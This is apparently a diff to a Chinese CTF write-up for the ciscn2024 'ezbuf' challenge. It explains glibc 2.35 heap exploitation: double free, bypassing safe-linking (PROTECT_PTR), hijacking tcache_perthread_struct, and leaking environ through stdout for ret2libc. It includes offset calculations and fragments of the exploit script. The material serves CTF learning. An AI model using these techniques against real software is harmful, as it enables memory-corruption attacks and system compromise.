@@ -330,7 +330,7 @@ large bin 大小与下标
 而bin_at为98的值对应的bins下标为 `(98-1)*2=194`
 所以计算出bk在main_arena的偏移为
 ```python
-word_bytes = context.word_size # i386->word_size=32  amd64->word_size=64
+word_bytes = context.word_size // 8 # i386->word_size=32  amd64->word_size=64
 bin_at = 98
 bins = (bin_at-1)*2
 offset = 4  # lock
@@ -1286,19 +1286,56 @@ p.interactive()
 ### 思路
 1. 通过泄露的unsortedbin的bk指针调试获取偏移，计算libc基址
 2. 将堆块释放进入tcache，利用PROTECT_PTR机制获取堆上地址(缺少最后12bit)，调试获取与heap基址的偏移，计算heap基址
-3. 申请0x40的堆块，填满tcache
+3. 利用create函数，不断创建0x40的堆块，最后释放，填满tcache
 4. 利用double free构造fastbin循环链表
 5. 将所有0x40大小的tcache全部申请出来
 6. 调试获取循环链表中第一个链表的地址与heap_base的差值(为了生成PROTECT_PTR保护后的地址)
 ![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-leak-3.png)
 7. 利用PROTECT_PTR公式，填充相应的地址`p64((heap_base + 0xf0)^((heap_base + 0x004e40)>>12))`
 ![](/img/wp/ciscn2024-初赛/ciscn2024-ezbuf-alloc.png)
-8. 在heap_base + 0xf0处(即0xf0大小的tcache块的entries指针处)，填上heap_base+0x10地址，之后申请0xe0大小的堆块后就会在heap_base+0x10处取堆块，由于tcache指向的是用户内存，所以它实际上申请到了tcache_perthread_struct
-9. 之后便可以更改tcache_perthread_struct了，可以实现tcache的任意分配，分配到stdout更改write_ptr和write_end指针泄露environ，调试environ与栈的偏移计算出栈地址，然后在利用tcache_perthread_struct分配到栈上进行ret2libc
+8. 在heap_base + 0xf0处(即0xf8大小的tcache块的entries指针处，详细计算过程见[tcache_perthread_struct](#tcache_perthread_struct))，填上heap_base+0x10地址，之后申请0xe0大小的堆块后就会在heap_base+0x10处取堆块，由于tcache指向的是用户内存，所以它实际上申请到了tcache_perthread_struct
+9. 之后便可以更改`tcache_perthread_struct`了，可以实现tcache的任意分配，分配到`stdout`更改`write_ptr`和`write_end`指针泄露`environ`，调试`environ`与栈的偏移计算出栈地址，然后在利用`tcache_perthread_struct`分配到栈上进行ret2libc
 
-关于tcache_perthread_struct的构造、_IO_2_1_stdout_的构造，最后栈偏移的计算还不熟悉，之后再补上
-#### tcache_perthread_struct
-#### _IO_2_1_stdout_
+### tcache_perthread_struct
+tcache_perthread_struct在glibc-2.30有个改动，改动了结构体中counts成员的数据类型
+```c
+# define TCACHE_MAX_BINS		64
+
+// glibc-2.30之前
+typedef struct tcache_perthread_struct
+{
+  char counts[TCACHE_MAX_BINS];
+  tcache_entry *entries[TCACHE_MAX_BINS];
+} tcache_perthread_struct;
+
+//glibc-2.30及以后
+typedef struct tcache_perthread_struct
+{
+  uint16_t counts[TCACHE_MAX_BINS];
+  tcache_entry *entries[TCACHE_MAX_BINS];
+} tcache_perthread_struct;
+```
+
+根据这个结构体，可以计算出0xf0大小的tcache块位于堆基址的偏移
+```python
+word_bytes = context.word_size // 8 # i386->word_size=32  amd64->word_size=64
+target = 0xf0
+
+# glibc-2.30之前
+offset = 0x10 + 0x40 + (target-0x20)/0x10 * word_bytes
+
+# glibc-2.30及以后
+offset = 0x10 + 0x80 + (target-0x20)/0x10 * word_bytes
+```
+本题是glibc-2.35，利用第二个公式，计算出offset为0xf8
+我们将heap_base + 0xf8这里的值覆盖为heap_base + 0x10
+当我们申请0xe0大小的空间时(利用解包过程中会申请与content大小相同的空间)，便会申请到heap_base+0x10开始的写权限
+即可劫持tcache_perthread_struct，实现堆任意分配
+
+### stdout
+还不熟悉，之后再补上
+
+### environ
 
 ### exp
 ```python
@@ -1397,9 +1434,11 @@ create(7,p64((heap_base+0xf0)^((heap_base+0x004e40)>>12)))
 create(8,b'aaaaaa')
 create(8,b'a')
 
-# fill heap_base+0xf0 entries ptr
+# 将0xf0大小的tcache块(entries指针地址在heap_base+0xf8)的entries改为heap_base+0x10
 create(8,p64(0) + p64(heap_base+0x10))
 
+# 解包过程中会申请0xe0的空间存放content，也就是说会申请0xf0大小的chunk，由于我们已经将0xf0大小的chunk的entries指针改为heap_base+0x10
+# 所以我们实际上申请到了heap_base位置的chunk，即tcache_perthread_struct
 do_nothing((((p16(0)*2+p16(1)+p16(1)).ljust(0x10,b"\x00")+p16(1)+p16(1)).ljust(0x90,b'\x00')+p64(stdout)+p64(stdout)+p64(0)*5+p64(heap_base+0x10)).ljust(0xe0,b"\x00"))
 
 # leak stack_addr
